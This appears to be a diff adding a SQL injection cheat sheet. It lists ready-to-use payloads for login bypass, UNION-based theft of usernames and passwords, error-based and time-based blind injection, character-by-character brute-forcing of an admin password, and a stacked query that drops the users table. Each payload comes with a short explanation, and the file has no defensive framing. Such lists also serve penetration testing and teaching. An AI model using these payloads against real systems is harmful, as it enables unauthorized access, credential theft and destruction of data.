@@ -1,0 +1,46 @@
+ Basic Payloads
+Bypass Authentication:
+
+' OR '1'='1'; --
+This payload can be used to bypass login forms by always evaluating to true.
+
+1.Union-Based Injection:
+
+' UNION SELECT null, username, password FROM users; --
+This payload retrieves data from the users table, assuming there are three columns in the original query.
+
+2. Error-Based SQL Injection
+Trigger an Error:
+
+' AND 1=CONVERT(int, (SELECT @@version)); --
+This can help attackers gain information about the database version by forcing an error.
+
+3. Time-Based Blind SQL Injection
+Using SLEEP:
+
+' OR IF(1=1, SLEEP(5), 0); --
+If the application takes longer to respond, it indicates the condition is true, useful for blind injections.
+
+4. Extracting Data
+Extracting Database Version:
+
+' UNION SELECT NULL, DATABASE(), USER(); --
+Brute-Force Passwords:
+
+' OR (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin')='a'; --
+
+5. Advanced Payloads
+Stacked Queries (if supported):
+
+'; DROP TABLE users; -- 
+This payload attempts to drop a table after executing a valid query, but it depends on the database's configuration.
+
+Second Order SQL Injection:
+
+'); INSERT INTO logs (action) VALUES ('Injected!'); --
+This type of payload is used when the injection occurs in a second query after the first is processed.
+
+6. Exploiting Functions
+Using Database Functions:
+
+' UNION SELECT NULL, @@version, NULL; --
